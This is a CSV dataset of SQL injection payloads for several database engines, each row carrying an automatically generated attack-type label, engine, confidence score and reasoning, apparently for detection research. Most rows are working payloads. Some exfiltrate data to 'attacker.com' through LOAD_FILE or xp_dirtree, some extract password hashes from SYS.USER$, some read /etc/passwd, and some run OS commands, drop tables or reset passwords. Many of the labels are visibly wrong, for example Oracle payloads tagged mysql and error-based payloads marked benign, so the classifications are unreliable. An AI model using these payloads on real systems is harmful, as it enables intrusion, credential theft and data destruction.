id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
40412,",(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;) ,(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40413,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL) ,(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)",time_blind,oracle,0.75,Time-blind signal detected: 'dbms_pipe' in oracle payload,4
40414,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL) ,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)",benign,oracle,0.8,No SQLi signals detected in payload (confidence 0.80),2
40415,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) ,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)",unknown,mysql,0.5,Payload too short or insufficient signal for classification,2
40416,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0))) ,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40417,[UNION],unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40418,’ or ‘1’=’1,benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),3
40419,' or '1'='1,boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40420,'||utl_http.request('httP://192.168.1.1/')||',out_of_band,generic,0.75,Out-of-band signal detected: 'utl_http' exfiltration function,4
40421,' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40422,' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40423,' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40424,' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40425,' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40426,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40427,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40428,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40429,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40430,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40431,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40432,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40433,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40434,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40435,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40436,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40437,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40438,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40439,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40440,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40441,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40442,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40443,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40444,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40445,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40446,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40447,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40448,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40449,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40450,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40451,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40452,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40453,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40454,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40455,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40456,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40457,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40458,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40459,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40460,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40461,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40462,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40463,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40464,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40465,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40466,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40467,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40468,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40469,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40470,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40471,"1,2,3--",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40472,"NULL,NULL--",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40473,1 SELECT*/NULL--,unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40474,"1+ + +NULL,NULL--",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40475,"' UNION SELECT 0x61646d696e,0x61646d696e--",union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,4
40476,1 AND 0x61=0x61,benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),3
40477,' OR 0x313d31--,unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40478,CHAR(39)||'OR'||CHAR(39)||'1'||CHAR(61)||CHAR(39)||'1',benign,mssql,0.8,No SQLi signals detected in payload (confidence 0.80),1
40479,"' UNION SELECT CHAR(65,68,77,73,78),NULL--",union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,4
40480,1; WAITFOR DELAY '0:0:5'--,time_blind,mssql,0.75,Time-blind signal detected: 'waitfor delay' in mssql payload,4
40481,'; WAITFOR DELAY '00:00:05'--,time_blind,mssql,0.75,Time-blind signal detected: 'waitfor delay' in mssql payload,4
40482,"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",boolean_blind,mssql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40483,'; DECLARE @q NVARCHAR(4000);SET @q=0x73656c656374;EXEC(@q)--,stacked_queries,mssql,0.75,Stacked queries signal detected: semicolon + new statement,2
40484,1;SELECT TOP 1 table_name FROM information_schema.tables--,stacked_queries,mysql,0.75,Stacked queries signal detected: semicolon + new statement,2
40485,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",union_based,mssql,0.75,UNION-based signal detected: 'union select' pattern found,4
40486,' UNION SELECT NULL FROM dual--,union_based,oracle,0.75,UNION-based signal detected: 'union select' pattern found,4
40487,' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,out_of_band,oracle,0.75,Out-of-band signal detected: 'utl_inaddr' exfiltration function,2
40488,1 AND ROWNUM=1 AND 1=1--,boolean_blind,oracle,0.75,Boolean blind signal detected: logical comparison pattern,4
40489,"' UNION SELECT NULL,NULL FROM dual--",union_based,oracle,0.75,UNION-based signal detected: 'union select' pattern found,4
40490,' AND 1=(SELECT COUNT(*) FROM all_tables)--,unknown,generic,0.5,Payload too short or insufficient signal for classification,0
40491,'; SELECT PG_SLEEP(5)--,stacked_queries,postgresql,0.75,Stacked queries signal detected: semicolon + new statement,2
40492,"' UNION SELECT NULL::text,NULL::text--",union_based,postgresql,0.75,UNION-based signal detected: 'union select' pattern found,2
40493,1;SELECT version()--,stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,2
40494,' AND 1=(SELECT COUNT(*) FROM pg_tables)--,unknown,postgresql,0.5,Payload too short or insufficient signal for classification,0
40495,'; COPY (SELECT '') TO PROGRAM 'id'--,unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40496,"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",error_based,mysql,0.75,Error-based signal detected: 'extractvalue' for mysql,4
40497,"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",error_based,mysql,0.75,Error-based signal detected: 'updatexml' for mysql,4
40498,"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",boolean_blind,mysql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40499,"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40500,"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40501,1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--,benign,mysql,0.8,No SQLi signals detected in payload (confidence 0.80),0
40502,' AND EXP(~(SELECT * FROM (SELECT user())x))--,boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40503,' AND SLEEP(5) AND '1'='1,time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40504,1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--,time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40505,"' AND IF(1=1,SLEEP(5),0)--",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40506,'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--,time_blind,mssql,0.75,Time-blind signal detected: 'waitfor delay' in mssql payload,4
40507,1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--,time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40508,"' AND SUBSTRING(username,1,1)='a' AND '1'='1",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40509,"' AND ASCII(SUBSTR(username,1,1))>64--",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40510,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,benign,mysql,0.8,No SQLi signals detected in payload (confidence 0.80),2
40511,"' AND MID(version(),1,1)='5'--",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40512,"' AND BINARY SUBSTRING(password,1,1)='a'--",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40513,' OR 1=1--,boolean_blind,generic,0.75,Boolean blind signal detected: logical comparison pattern,4
40514,' OR 1 = 1--,boolean_blind,generic,0.75,Boolean blind signal detected: logical comparison pattern,4
40515,'; DROP TABLE users; --,stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,4
40516,"'; INSERT INTO users VALUES('hacker','pw')--",stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,4
40517,1'; UPDATE users SET password='hacked' WHERE '1'='1,stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,4
40518,'; EXEC('SELECT 1')--,stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,4
40519,1; SELECT * FROM users--,stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,2
40520,"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",out_of_band,mysql,0.75,Out-of-band signal detected: 'load_file' exfiltration function,1
40521,'; EXEC master..xp_dirtree '//attacker.com/a'--,out_of_band,generic,0.75,Out-of-band signal detected: 'xp_dirtree' exfiltration function,3
40522,"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",out_of_band,mysql,0.75,Out-of-band signal detected: 'load_file' exfiltration function,0
40523,' UNION SELECT NULL--,union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,4
40524,"' UNION SELECT NULL,NULL--",union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,4
40525,"' UNION SELECT NULL,NULL,NULL--",union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,4
40526,"' UNION SELECT NULL,NULL,NULL,NULL--",union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,4
40527,"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,4
40528,"' UNION ALL SELECT NULL,NULL--",union_based,generic,0.75,UNION-based signal detected: 'union all select' pattern found,4
40529,"1 UNION SELECT @@version,NULL--",union_based,mysql,0.75,UNION-based signal detected: 'union select' pattern found,2
40530,"1 UNION SELECT user(),database()--",union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,4
40531,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",union_based,mysql,0.75,UNION-based signal detected: 'union select' pattern found,4
40532,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",union_based,mysql,0.75,UNION-based signal detected: 'union select' pattern found,4
40533,' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,auth_bypass,generic,0.75,Auth bypass signal detected: 'admin' with quote/comment syntax,3
40534,"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",auth_bypass,generic,0.75,Auth bypass signal detected: 'admin' with quote/comment syntax,2
40535,1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0,unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40536,"' AND ORD(MID(password,1,1))>64 AND '1'='1",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40537,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40538,' '1'='1,unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40539,"1 UN ION SEL ECT NULL,NULL--",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40540,"1 NULL,NULL--",unknown,generic,0.5,Payload too short or insufficient signal for classification,2
40541,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",benign,mysql,0.8,No SQLi signals detected in payload (confidence 0.80),2
40542,"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",error_based,mysql,0.75,Error-based signal detected: 'extractvalue' for mysql,4
40543,"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",union_based,generic,0.75,UNION-based signal detected: 'union select' pattern found,3
